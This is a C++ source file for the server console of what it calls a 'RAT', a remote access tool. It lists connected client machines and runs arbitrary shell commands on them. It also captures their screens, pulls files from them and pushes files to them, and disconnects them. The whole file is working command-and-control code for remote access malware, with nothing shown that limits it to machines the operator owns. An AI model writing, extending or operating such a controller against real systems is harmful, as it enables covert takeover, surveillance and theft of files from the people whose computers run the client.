#include "ServerCommandController.hpp"
#include "ServerManager.hpp"
#include "ServerLogController.hpp"
#include "ServerFileController.hpp"
#include <iostream>
#include <sstream>
#include <fstream>
#include <chrono>
#include <termios.h>
#include "Utils/TCPSocket.hpp"
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <cstdlib>
#include <nlohmann/json.hpp>

namespace Server {

ServerCommandController::ServerCommandController(ServerManager *manager) : IController(manager), manager_(manager) {}
ServerCommandController::~ServerCommandController() { stop(); }

void ServerCommandController::start() {
    if (running_) return;
    running_ = true;

    // Only use existing client connections managed by ServerManager; rely on stdin for admin input
    if (isatty(STDIN_FILENO)) {
        stdinThread_ = std::make_unique<std::thread>(&ServerCommandController::stdinLoop, this);
    }
}

void ServerCommandController::handle(const nlohmann::json &packet) {
    // Receive bash command responses and store them
    std::lock_guard<std::mutex> lock(bashMtx_);
    bashResponses_.push(packet);
}

// spawn a terminal emulator (or tmux) to run innerCmd; returns pid (>0) for forked child,
// 0 when launched in tmux, -1 on failure
pid_t ServerCommandController::spawnTerminal(const std::string &innerCmd) {
    auto which_ok = [](const char *name)->bool {
        std::string cmd = std::string("which ") + name + " >/dev/null 2>&1";
        return std::system(cmd.c_str()) == 0;
    };

    std::string prog;
    if (which_ok("qterminal")) prog = "qterminal";
    else if (which_ok("xfce4-terminal")) prog = "xfce4-terminal";
    else if (which_ok("gnome-terminal")) prog = "gnome-terminal";
    else if (which_ok("konsole")) prog = "konsole";
    else if (which_ok("tilix")) prog = "tilix";
    else if (which_ok("alacritty")) prog = "alacritty";
    else if (which_ok("kitty")) prog = "kitty";
    else if (which_ok("xterm")) prog = "xterm";
    else if (which_ok("tmux")) prog = "tmux";
    else return -1;

    if (prog == "tmux") {
        std::string s = std::string("tmux new-session -d -s rat_server '") + innerCmd + "'";
        int rc = std::system(s.c_str());
        return rc == 0 ? 0 : -1;
    }

    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        setsid();
        
        int devnull = open("/dev/null", O_WRONLY);
        if (devnull != -1) {
            dup2(devnull, STDOUT_FILENO);
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
        
        if (prog == "qterminal") {
            execlp("qterminal", "qterminal", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "xfce4-terminal") {
            execlp("xfce4-terminal", "xfce4-terminal", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "gnome-terminal") {
            execlp("gnome-terminal", "gnome-terminal", "--", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "konsole") {
            execlp("konsole", "konsole", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "tilix") {
            execlp("tilix", "tilix", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "alacritty") {
            execlp("alacritty", "alacritty", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "kitty") {
            execlp("kitty", "kitty", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "xterm") {
            execlp("xterm", "xterm", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        }
        _exit(127);
    }

    return pid;
}

std::string ServerCommandController::processLine(const std::string &line) {
    std::istringstream iss(line);
    std::string cmd; iss >> cmd;
    std::string reply;
    if (cmd == "help") {
        return handleHelp();
    } else if (cmd == "list") {
        return handleList();
    } else if (cmd == "choose") {
        std::string name; iss >> name;
        return handleChoose(name);
    } else if (cmd == "kill") {
        std::string name; iss >> name;
        return handleKill(name);
    } else if (cmd == "killall") {
        return handleKillAll();
    } else if (cmd == "bash") {
        std::string name; iss >> name;
        std::string rest;
        std::getline(iss, rest);
        if (!rest.empty() && rest.front() == ' ') rest.erase(0,1);
        return handleBash(name, rest);
    } else if (cmd == "download") {
        std::string arg1, arg2, arg3;
        iss >> arg1 >> arg2 >> arg3;
        std::string name, remotePath, localPath;
        if (manager_->hasClient(arg1)) {
            name = arg1;
            remotePath = arg2;
            localPath = arg3.empty() ? "." : arg3;
        } else {
            name = "";
            remotePath = arg1;
            localPath = arg2.empty() ? "." : arg2;
        }
        std::string targetClient = name.empty() ? selectedClient_ : name;
        ServerFileController fileCtrl(manager_);
        return fileCtrl.handleDownload(targetClient, remotePath, localPath);
    } else if (cmd == "upload") {
        std::string arg1, arg2, arg3;
        iss >> arg1 >> arg2 >> arg3;
        std::string name, localPath, remotePath;
        if (manager_->hasClient(arg1)) {
            name = arg1;
            localPath = arg2;
            remotePath = arg3.empty() ? "." : arg3;
        } else {
            name = "";
            localPath = arg1;
            remotePath = arg2.empty() ? "." : arg2;
        }
        std::string targetClient = name.empty() ? selectedClient_ : name;
        ServerFileController fileCtrl(manager_);
        return fileCtrl.handleUpload(targetClient, localPath, remotePath);
    } else if (cmd == "screenshot") {
        std::string name; iss >> name;
        return handleScreenshot(name);
    } else if (cmd == "quit") {
        return handleQuit();
    } else if (cmd == "showlogs") {
        return handleShowLogs();
    }
    return std::string("Unknown command\n");
}

std::string ServerCommandController::handleList() {
    if (!manager_) return "Manager not available\n";
    std::string reply;
    auto clients = manager_->listClients();
    if (clients.empty()) return "No clients connected\n";
    reply = "Connected clients:\n";
    for (auto &c : clients) {
        std::string ip = manager_->getClientIP(c);
        reply += "  - " + c + " (" + ip + ")\n";
    }
    return reply;
}

std::string ServerCommandController::handleHelp() {
    std::string help;
    help += "\nAvailable Commands:\n";
    help += "==================\n";
    help += "  help                     - Show this help message\n";
    help += "  list                     - List all connected clients\n";
    help += "  choose <client>          - Select a client for subsequent commands\n";
    help += "  kill [client]            - Disconnect client (uses selected if not specified)\n";
    help += "  killall                  - Disconnect all clients\n";
    help += "  bash [client] <command>  - Execute shell command (uses selected if not specified)\n";
    help += "  screenshot [client]      - Capture screenshot (uses selected if not specified)\n";
    help += "  download [client] <remote_path> [local_path]  - Download file from client (default: .)\n";
    help += "  upload [client] <local_path> [remote_path]    - Upload file to client (default: .)\n";
    help += "  showlogs                 - Open log viewer in new terminal (tail -F)\n";
    help += "  quit                     - Stop server and exit\n";
    help += "\nWorkflow:\n";
    help += "  1. list                  - See connected clients\n";
    help += "  2. choose client1        - Select client1\n";
    help += "  3. bash ls -la           - Run command on selected client\n";
    help += "  4. screenshot            - Capture screenshot from selected client\n";
    help += "\nExamples:\n";
    help += "  bash client1 ls -la      - List files on client1 (explicit)\n";
    help += "  screenshot client1       - Take screenshot from client1 (explicit)\n";
    help += "  choose client1           - Select client1\n";
    help += "  bash pwd                 - Show directory on selected client\n";
    help += "  screenshot               - Take screenshot from selected client\n";
    help += "  kill                     - Disconnect selected client\n";
    help += "\n";
    return help;
}

std::string ServerCommandController::handleChoose(const std::string &name) {
    if (!manager_) return "Manager not available\n";
    if (name.empty()) return "Invalid client name\n";
    if (name.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Invalid characters in client name\n";
    }
    if (manager_->hasClient(name)) {
        selectedClient_ = name;
        return std::string("Selected client: ") + name + "\n";
    }
    return std::string("No such client\n");
}

std::string ServerCommandController::handleKill(const std::string &name) {
    if (!manager_) return "Error: Manager not available\n";
    
    std::string targetClient = name.empty() ? selectedClient_ : name;
    
    if (targetClient.empty()) {
        return "Error: No client specified and no client selected\n";
    }
    
    // Security: validate client name
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Error: Invalid characters in client name\n";
    }
    
    // Send kill command to client (graceful shutdown)
    if (manager_->hasClient(targetClient)) {
        nlohmann::json killCmd{{"controller", "kill"}};
        manager_->sendRequest(targetClient, killCmd);
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
    
    // Remove client from server
    if (manager_->removeClient(targetClient)) {
        if (targetClient == selectedClient_) {
            selectedClient_.clear();
        }
        return "Client disconnected: " + targetClient + "\n";
    }
    
    return "Error: Client '" + targetClient + "' not found\n";
}

std::string ServerCommandController::handleKillAll() {
    if (!manager_) return "Error: Manager not available\n";
    
    auto clients = manager_->listClients();
    if (clients.empty()) {
        return "No clients connected\n";
    }
    
    // Send kill command to all clients
    nlohmann::json killCmd{{"controller", "kill"}};
    for (const auto &clientName : clients) {
        manager_->sendRequest(clientName, killCmd);
    }
    
    // Wait for graceful shutdown
    std::this_thread::sleep_for(std::chrono::milliseconds(300));
    
    // Remove all clients
    int killed = 0;
    for (const auto &clientName : clients) {
        if (manager_->removeClient(clientName)) {
            killed++;
        }
    }
    
    selectedClient_.clear();
    return "Disconnected " + std::to_string(killed) + " client(s)\n";
}

std::string ServerCommandController::handleBash(const std::string &name, const std::string &cmd) {
    if (!manager_) return "Error: Manager not available\n";
    
    // Determine target client and command
    std::string targetClient;
    std::string command;
    
    if (name.empty()) {
        if (selectedClient_.empty()) {
            return "Error: No client specified and no client selected\n";
        }
        targetClient = selectedClient_;
        command = cmd;
    } else if (manager_->hasClient(name)) {
        targetClient = name;
        command = cmd;
    } else {
        if (selectedClient_.empty()) {
            return "Error: Client '" + name + "' not found and no client selected\n";
        }
        // Treat name as part of the command
        targetClient = selectedClient_;
        command = name + (cmd.empty() ? "" : " " + cmd);
    }
    
    // Validate client name for security
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Error: Invalid characters in client name\n";
    }
    
    if (command.empty()) {
        return "Error: Empty command\n";
    }
    
    // Send bash command request
    nlohmann::json request{
        {"controller", "bash"},
        {"cmd", command}
    };
    
    if (!manager_->sendRequest(targetClient, request)) {
        return "Error: Failed to send command to " + targetClient + "\n";
    }
    
    // Wait for and receive response directly
    nlohmann::json response;
    if (manager_->receiveResponse(targetClient, response, 5000)) {
        if (response.contains("out") && response["out"].is_string()) {
            std::string output = response["out"].get<std::string>();
            int exitCode = response.contains("ret") ? response["ret"].get<int>() : -1;
            return "Output:\n" + output + "Exit code: " + std::to_string(exitCode) + "\n";
        }
    }
    
    return "Warning: No response received (command may still be running)\n";
}

std::string ServerCommandController::handleScreenshot(const std::string &name) {
    if (!manager_) return "Error: Manager not available\n";
    
    // Determine target client
    std::string targetClient;
    if (name.empty()) {
        if (selectedClient_.empty()) {
            return "Error: No client specified and no client selected\n";
        }
        targetClient = selectedClient_;
    } else if (manager_->hasClient(name)) {
        targetClient = name;
    } else {
        return "Error: Client '" + name + "' not found\n";
    }
    
    // Validate client name
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Error: Invalid characters in client name\n";
    }
    
    // Send screenshot request
    nlohmann::json request{
        {"controller", "screenshot"},
        {"action", "take"}
    };
    
    if (!manager_->sendRequest(targetClient, request)) {
        return "Error: Failed to send screenshot request to " + targetClient + "\n";
    }
    
    // Wait for response with screenshot data
    nlohmann::json response;
    if (!manager_->receiveResponse(targetClient, response, 10000)) {
        return "Error: Timeout waiting for screenshot from " + targetClient + "\n";
    }
    
    // Check response
    if (!response.contains("success") || !response["success"].get<bool>()) {
        std::string error = response.contains("error") ? response["error"].get<std::string>() : "Unknown error";
        return "Screenshot failed: " + error + "\n";
    }
    
    if (!response.contains("data")) {
        return "Error: Response missing screenshot data\n";
    }
    
    // Decode base64 screenshot data
    std::string base64Data = response["data"].get<std::string>();
    std::string imageData;
    
    // Simple base64 decode
    static const std::string base64_chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    
    int val = 0, valb = -8;
    for (unsigned char c : base64Data) {
        if (c == '=') break;
        if (std::isspace(c)) continue;
        
        size_t pos = base64_chars.find(c);
        if (pos == std::string::npos) continue;
        
        val = (val << 6) + pos;
        valb += 6;
        if (valb >= 0) {
            imageData.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    
    // Save screenshot to /tmp with timestamp
    auto now = std::chrono::system_clock::now();
    auto timestamp = std::chrono::system_clock::to_time_t(now);
    std::string filename = "/tmp/screenshot_" + targetClient + "_" + std::to_string(timestamp) + ".png";
    
    std::ofstream outFile(filename, std::ios::binary);
    if (!outFile) {
        return "Error: Failed to save screenshot to " + filename + "\n";
    }
    
    outFile.write(imageData.data(), imageData.size());
    outFile.close();
    
    // Open image with default viewer
    std::string openCmd = "xdg-open '" + filename + "' 2>/dev/null &";
    system(openCmd.c_str());
    
    return "Screenshot saved to " + filename + "\n";
}

bool ServerCommandController::popBashResponse(nlohmann::json &out, int timeoutMs) {
    auto start = std::chrono::steady_clock::now();
    while (true) {
        {
            std::lock_guard<std::mutex> lock(bashMtx_);
            if (!bashResponses_.empty()) {
                out = bashResponses_.front();
                bashResponses_.pop();
                return true;
            }
        }
        
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - start).count();
        if (elapsed >= timeoutMs) return false;
        
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

std::string ServerCommandController::handleQuit() {
    running_ = false;
    if (manager_) {
        manager_->stop();
        std::cout << "\nServer shutting down..." << std::endl;
    }
    std::exit(0);
    return std::string();
}

std::string ServerCommandController::handleShowLogs() {
    auto *logController = dynamic_cast<ServerLogController*>(
        manager_->getSystemController("log"));
    
    if (!logController) {
        return "Error: Log controller not available\n";
    }
    
    std::string logPath = manager_->logPath();
    if (logPath.empty()) {
        logPath = "/tmp/rat_server.log";
    }
    
    // Launch terminal with tail -F command
    std::string cmd = "tail -F " + logPath + "; exec bash";
    pid_t pid = spawnTerminal(cmd);
    
    if (pid == -1) {
        return "Error: Could not launch terminal emulator\n" +
               std::string("Log file: ") + logPath + "\n" +
               "To view manually: tail -F " + logPath + "\n";
    }
    
    if (pid == 0) {
        return "Launched log viewer in tmux session\n";
    }
    
    return "Launched log viewer in terminal (PID: " + std::to_string(pid) + ")\n";
}

// adminLoop removed: we use existing client connections via ServerManager and stdin for commands

void ServerCommandController::stdinLoop() {
    std::string line;
    std::cout << "\n=== RAT Server Control ===" << std::endl;
    std::cout << "Type 'help' for available commands\n" << std::endl;
    
    while (running_) {
        if (!selectedClient_.empty()) {
            std::cout << "[" << selectedClient_ << "] > " << std::flush;
        } else {
            std::cout << "\n> " << std::flush;
        }
        if (!std::getline(std::cin, line)) break;
        if (line.empty()) continue;
        
        std::string reply = processLine(line);
        if (!reply.empty()) {
            std::cout << reply << std::flush;
        }
    }
}

void ServerCommandController::stop() {
    if (!running_) return;
    running_ = false;
    if (stdinThread_ && stdinThread_->joinable()) stdinThread_->join();
}

}
